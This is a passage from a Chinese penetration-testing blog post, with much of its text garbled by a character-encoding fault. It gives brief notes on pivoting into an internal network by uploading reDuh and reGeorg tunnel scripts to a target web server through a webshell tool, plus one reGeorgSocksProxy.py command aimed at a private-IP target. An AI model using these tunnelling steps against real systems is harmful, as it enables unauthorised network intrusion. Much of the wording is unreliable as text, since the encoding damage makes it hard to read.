<h3 id="2ã€æ²¡æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹"><a href="#2ã€æ²¡æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹" class="headerlink" title="2ã€æ²¡æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹"></a>2ã€æ²¡æœ‰å…¬ç½‘ipçš„æƒ…å†µä¸‹</h3><h4 id="é€šè¿‡ç«¯å£è½¬å‘è„šæœ¬è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥"><a href="#é€šè¿‡ç«¯å£è½¬å‘è„šæœ¬è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥" class="headerlink" title="é€šè¿‡ç«¯å£è½¬å‘è„šæœ¬è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥"></a>é€šè¿‡ç«¯å£è½¬å‘è„šæœ¬è§£å†³å†…ç½‘è¿œç¨‹è¿æ¥</h4><blockquote>
<p>åªèƒ½é€šè¿‡å†…ç½‘çš„webè¿›è¡Œè¿æ¥<br>ä½¿ç”¨reDuhGUI_0.1å·¥å…·åˆ©ç”¨èœåˆ€å°†reDuh.phpè„šæœ¬ä¸Šä¼ åˆ°é¶æœºã€‚ç„¶ååŒå‡»ç‰©ç†æœºçš„reDuhGUI.exeè¿è¡Œè„šæœ¬<br>å¦‚æœæœ‰å®‰å…¨ç‹—ä¼šè¢«æ‹¦æˆª</p>
</blockquote>
<h2 id="å†…ç½‘æ¸—é€ï¼ˆå†…åˆ°å†…åˆ°å†…æ¸—é€ï¼‰"><a href="#å†…ç½‘æ¸—é€ï¼ˆå†…åˆ°å†…åˆ°å†…æ¸—é€ï¼‰" class="headerlink" title="å†…ç½‘æ¸—é€ï¼ˆå†…åˆ°å†…åˆ°å†…æ¸—é€ï¼‰"></a>å†…ç½‘æ¸—é€ï¼ˆå†…åˆ°å†…åˆ°å†…æ¸—é€ï¼‰</h2><p>å†…ç½‘æ¸—é€ä½¿ç”¨è¿™ä¸¤ä¸ªå·¥å…·â€“reGeorg+Proxifier<br>é¦–å…ˆè¿›å…¥regeorgæ–‡ä»¶å°†tunnel.nosocket.phpä¸Šä¼ åˆ°é¶æœºwebæ ¹ç›®å½•æœ¬åœ°pythonè¿è¡Œ pip install urllib3ç¯å¢ƒä¸‹æ‰§è¡Œcmd<br>reGeorg-master[reGeorgSocksProxy.py](<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://reGeorgSocksProxy.py">https://links.jianshu.com/go?to=http%3A%2F%2FreGeorgSocksProxy.py</a>) -p  9999 -u <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.60.118:8080/tunnel.nosocket.php">http://192.168.60.118:8080/tunnel.nosocket.php</a></p>
<p><img src="/image/%E5%86%85%E7%BD%91.jpg"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>future.zhangyan</span>
                    </p>
                
				
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://zhangyanlady.github.io/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">https://zhangyanlady.github.io/2020/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>The future can be expected, the world is worth it.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># ç½‘ç»œå®‰å…¨</a>
                    
                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># æ¸—é€æµ‹è¯•</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/09/10/WhatWeb%E4%BD%BF%E7%94%A8/">WhatWebä½¿ç”¨</a>
            
            
            <a class="next" rel="next" href="/2020/07/23/%E6%97%81%E6%B3%A8%E3%80%81%E7%9B%AE%E5%BD%95%E8%B6%8A%E6%9D%83%E3%80%81%E8%B7%A8%E5%BA%93%E3%80%81CDN%E7%BB%95%E8%BF%87/">æ—æ³¨ã€ç›®å½•è¶Šæƒã€è·¨åº“ã€CDNç»•è¿‡</a>
            
        </section>
			</br>
			

</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
	<span id="busuanzi_container_site_pv">
    æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
</span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

    </div>


	
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
